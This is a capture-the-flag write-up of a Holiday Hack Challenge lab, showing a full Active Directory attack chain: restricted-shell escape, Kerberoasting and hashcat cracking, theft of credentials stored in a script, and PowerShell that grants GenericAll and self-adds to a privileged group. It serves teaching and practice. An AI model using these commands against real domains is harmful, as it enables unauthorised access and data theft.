# Objective 8: Kerberoasting on an Open Fire
**Location: Staging**  
**Elf: Jingle Ringford**  
**Hints provided by Eve Snowshoes after completion of [HoHo ... No](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/HoHo...No.md)**

The objective to obtain a secret research document.
In order to get an account in the ELFU AD domain, a registration on https://register.elfu.org is required.
After that an individual username and password is provided which can be used to logon to grades.elfu.org using SSH on port 2222.

### Escaping Application
After the SSH login an application is automatically started.
It is possible to escape this application by sending an EOF (CTRL-D).

### Escaping Python Shell
After this a Python shell is displayed.
In order to escape this `os.system.("bash")` has to be submitted in order to get to a normal Unix shell.

### Reconnaissance
An nmap scan of the network 10.128.0.0/22 reveals two hosts providing Windows services: 10.128.1.53 (domain controller) and 10.128.3.30 (samba file server) with the shares `elfu_svc_shr` and `research_dep`.


### Pulling data from AD
Next the tool `ldapdomaindump` can be used in order to get an idea of the user<->group<->permission structure:
```
ldapdomaindump 10.128.1.53 -u 'elfu\{userid}' -p '{password}'
```
This can be done manually or using Bloodhound.
Bloodhound also reveals that the user `elfu_svc` is Kerberoastable.

The password hash for this Kerberoastable user can be obtained by running
```
GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 'elfu.local/{userid}:{passworð}' -request
```

### Cracking the Password
We follow the hints and prepare the password cracking as follows:
We prepare a password list using CeWL, keeping in mind that explicitly also digits are valid as per the provided hint:
```
./cewl.rb https://register.elfu.org/register --with-numbers -w wordlist
```
In addition, also following the hint, the OneRuleToRuleThemAll rule for Hashcat is downloaded:
```
curl -OJ https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
```
Equipped with these tools, we can let Hashcat crack the password:
```
hashcat -m 13100 -a0 spn.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 wordlist
```

Hashcat finds the password for `elfu_svc` to be `Snow2021!`.

### Access to elfu_svc_shr
With this information we can get access to the elfu_svc_shr file share on 10.128.3.30:
```
smbclient -U elfu_svc '\\10.128.3.30\elfu_svc_shr'
```
On this share are several Powershell scripts. One of them, `GetProcessInfo.ps1`, holds credentials for the user `remote_elf`:
```powershell
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
```

### Getting into group Research Department
With the `remote_elf` credential snippet from the script, we can grant our windows domain user the `GenericAll` permissions for the group Research Department (based on [scripts](https://github.com/chrisjd20/hhc21_powershell_snippets) provided by Chris Davis, a Kringle Con speaker) :
```powershell
Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
  Add-Type -AssemblyName System.DirectoryServices
  $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
  $username = "{userid}"
  $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
  $propGUID = [guid]'00000000-0000-0000-0000-000000000000'
  $IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
  $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
  $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
  $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
  $secOptions = $domainDirEntry.get_Options()
  $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
  $domainDirEntry.RefreshCache()
  $domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
  $domainDirEntry.CommitChanges()
  $domainDirEntry.dispose()
} -Credential $aCred -Authentication Negotiate
```
and add then our user to this group:
```powershell
Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
  Add-Type -AssemblyName System.DirectoryServices
  $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
  $username = "{userid}"
  $password = "{password}"
  $domainDirEntry = New-Object   System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
  $user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
  $sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
  $b=New-Object byte[] $sid.BinaryLength
  $sid.GetBinaryForm($b,0)
  $hexSID=[BitConverter]::ToString($b).Replace('-','')
  $domainDirEntry.Add("LDAP://<SID=$hexSID>")
  $domainDirEntry.CommitChanges()
  $domainDirEntry.dispose()
} -Credential $aCred -Authentication Negotiate
```
### Access to research_dep share
After a few minutes, our new group membership gets replicated to the samba file server, so that we now have access to the secret document:
```
smbclient '\\10.128.3.30\research_dep'
smb: \> dir
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Fri Dec 24 08:01:27 2021
  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021

		41089256 blocks of size 1024. 34373492 blocks available
```

The [PDF document](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Objective-8/SantaSecretToAWonderfulHolidaySeason.pdf) lists **Kindness** as first secret ingredient for a wonderful holiday season.

---
### Bonus: Automation - Kerberoboting
This whole process was automated in an `expect` [script](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Objective-8/kerberoboting) named `kerberoboting`, so that you can enjoy a brew whilst your computer does the work.
It just requires you to register at https://register.elfu.org, have `hashcat` installed in the PATH and a working CeWL in the local directory:
```
joergen@northpole:~$ ./kerberoboting jsfdgdsjjl 'Ndcopkmbo#'
#
# Kerberoboting in progress - get a brew and lean back
#

Retrieving the wordlist from register.elfu.org using CeWL
Retrieving the OneRuleToRuleThemAll rule for Hashcat
Logging on to grades.elfu.org using SSH
Escaping the application using <EOF>
Escaping the Python shell using os.system('bash')
These shares are available on the file server
smbclient -L '\\\\10.128.3.30'
Enter WORKGROUP\jsfdgdsjjl's password: 

	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      
	sysvol          Disk      
	elfu_svc_shr    Disk      elfu_svc_shr
	research_dep    Disk      research_dep
	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
Running GetUserSPNs.py using my user id to enumerate SPNs linked to user accounts and get their password hashes
Running Hashcat to crack the password
  ok. Password is Snow2021!
Getting access to samba \\\\10.128.3.30\elfu_svc_shr share as user elfu_svc
Obtaining file GetProcessInfo.ps1 which has credentials for remote_elf embedded
Granting myself GenericAll permissions on AD group Research Department and adding myself to it
Getting access to samba \\\\10.128.3.30\research_dep using my user id
dir
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Fri Dec 24 08:01:27 2021
  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021

		41089256 blocks of size 1024. 34373492 blocks available
smb: \\> Getting file SantaSecretToAWonderfulHolidaySeason.pdf
Transferring file SantaSecretToAWonderfulHolidaySeason.pdf to local machine

#
# Have fun and explore more
#

jsfdgdsjjl@grades:~$ 
```

You can see `kerberoboting` in action here: https://asciinema.org/a/458522

**Achievement: Kerberoasting on an Open Fire**
